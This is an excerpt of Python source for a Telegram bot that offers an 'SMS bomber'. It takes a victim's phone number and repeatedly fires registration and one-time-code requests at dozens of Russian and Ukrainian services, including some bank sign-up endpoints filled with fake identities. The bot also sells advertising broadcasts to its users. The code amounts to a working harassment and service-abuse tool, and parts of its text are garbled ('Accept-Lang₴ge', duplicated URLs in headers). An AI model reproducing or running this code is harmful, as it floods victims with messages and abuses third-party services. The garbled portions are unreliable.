...
ADMIN_CHAT_ID = 893263567

group_id = -1001259648769
...
def send_message_users(message):
    ...
    bot.send_message(
        ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")
...
def start(message):
    ...
    if user_status == 'restricted' or user_status == 'left' or user_status == 'kicked':
        bot.send_message(
            message.chat.id, 'Вы не подписаны на наш канал.\nПодпишитесь на него чтобы получить доступ к боту.', reply_markup=inl_keyboard)


def send_for_number(phone):
    while True:
        # request_timeout = 0.0000002
        phone1 = '+'+phone[0]+' '+'('+phone[1]+phone[2]+phone[3]+')'+" " + \
            phone[4]+phone[5]+phone[6]+'-'+phone[7] + \
            phone[8]+'-'+phone[9]+phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + \
        ...
        try:
            ...
            requests.post('https://driver.gett.ru/api/login/phone/', data={'phone': phone, 'registration': 'true'}, headers={'Accept-Encoding': 'gzip, deflate, br', 'Accept-Lang₴ge': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Cookie': 'csrftoken=' +
                                                                                                                             a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_₴_107450310_1=1; _ym_isad=2', 'Host': 'driver.gett.ru (http://driver.gett.ru/)', 'Referer': 'https://driver.gett.ru/signup/', 'User-Agent': 'Mozilla/5.0 (https://driver.gett.ru/signup/', 'User-Agent': 'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0', 'X-CSRFToken': a.cookies['csrftoken']})
        except Exception as e:
            pass

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data={"phone": phone}, headers={'Accept-Lang₴ge': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive',
                                                                                                                  'Host': 'api.ivi.ru (http://api.ivi.ru/)', 'origin': 'https://www.ivi.ru/', 'Referer': 'https://www.ivi.ru/profile (https://www.ivi.ru/', 'Referer': 'https://www.ivi.ru/profile)'})
        except:
            pass
        ...
        try:
            ...
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone}, headers={'Accept-Lang₴ge': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=' +
                                                                                                             b.cookies['JSESSIONID']+';', 'Host': 'drugvokrug.ru (http://drugvokrug.ru/)', 'Referer': 'https://drugvokrug.ru/', 'User-Agent': 'Mozilla/5.0 (https://drugvokrug.ru/', 'User-Agent': 'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0', 'X-Requested-With': 'XMLHttpRequest'})
        except Exception as e:
            pass

        # Добавленые сервисы
        try:
            rutaxi = requests.post(
                'https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
        except Exception as e:
            pass

        try:
            rutube = requests.post(
                'https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
        except Exception as e:
            pass

        try:
            psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1', 'birthDate': '10.10.2000',
                                                                                                              'mobilePhone': phone[1:], 'russianFederationResident': 'true', 'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null', 'promotionAgreement': 'true'})
        except Exception as e:
            pass

        try:
            beltelecom = requests.post(
                'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        except Exception as e:
            pass

        try:
            modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={
                                      'FirstName': 'Саша', 'CellPhone': phone[1:], 'Package': 'optimal'})
        except Exception as e:
            pass
        ...
        try:
            ...
            aptkru = requests.post(
                'https://apteka.ru/_action/auth/getForm/', data=data)
        except Exception as e:
            pass

        try:
            tvzavr = requests.post('https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone='+phone +
                                   '&csrf_value=a222ba2a464543f5ac6ad097b1e92a49 (https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=%27+phone+%27&csrf_value=a222ba2a464543f5ac6ad097b1e92a49)')
        except Exception as e:
            pass
        ...
        try:
            ...
            headers = {
                ...
                'Accept-Lang₴ge': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            ...
            netprint = requests.post('https://www.netprint.ru/order/social-auth', headers=headers,   data={
                                     'operation': 'stdreg', 'email_or_phone': phone, 'i_agree_with_terms': 1})
        except Exception as e:
            pass

        try:
            requests.post('http://youdrive.today/login/web/phone',
                          data={'phone': phone, 'phone_code': 7})
        except Exception as e:
            pass

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' +
                         phone+'&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
            pass
        ...
        try:
            topPHONE = '+'+phone[0]+'('+phone[1]+phone[2]+phone[3]+')'+phone[4] + \
                phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
            topshop = requests.post(
                'https://www.top-shop.ru/login/loginByPhone/', data={'phone': topPHONE})
        except Exception as e:
            pass
...
def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(
            chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите STOP и поробуйте снова')
        return
    ...
    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        ...
        bot.send_message(
            chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
...
def handle_message_received(message):
    ...
    if user_status == 'member' or user_status == 'administrator' or user_status == 'creator':
        ...
        if text == "Добавить партнер" and chat_id == ADMIN_CHAT_ID:
            a = bot.send_message(
                message.chat.id, "Пришлите рекламу вашего партнера:")
            ...
            bot.send_message(
                chat_id, 'Владелец бота: @im_Anonimus \nПо вопросам сотрудничества обращаться в ЛС сюда @im_Anonimus \nБот работает пока что только на Россию и Украину')

        elif text == '🔥💣БОМБЕР':
            bot.send_message(
                chat_id, 'Введите номер в формате:\n🇷🇺 79xxxxxxxxx\n🇺🇦 380xxxxxxxxx')
            ...
            bot.send_message(chat_id, 'Ребята, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI карта: ' +
                             '<pre>999999999999999</pre>', parse_mode="HTML")
 ...
 Купить: @im_Anonimus  """)
            ...
            bot.send_message(
                chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')
            ...
            predlog = '✅Не знаете где дать рекламу качественно и не дорого?\n🏛Тогда вы по адресу!!!\n\n👥 У нас вашу рекламу увидят все пользователи бота\n📨 @baksikon_bot\n\n🗣 Каждый пользователь получит сообщение от бота с вашей рекламой!\n☀️ ' + \
                str(users_amount[0]) + ' ☀️ активных пользователей!\n\n💶 Цена рассылки: 150 ₴\n\nРеклама - 🤝Наш партнёр\n24 часа (1 день) + 1 рассылка - 250₴\n48 часов (2 дня) + 1 рассылка - 300₴\n120 часов (5 дней) + 1 рассылка - 500₴\nВаш текст будет во вкладке 🤝Наш партнёр\n\nКупить: @im_Anonimus '
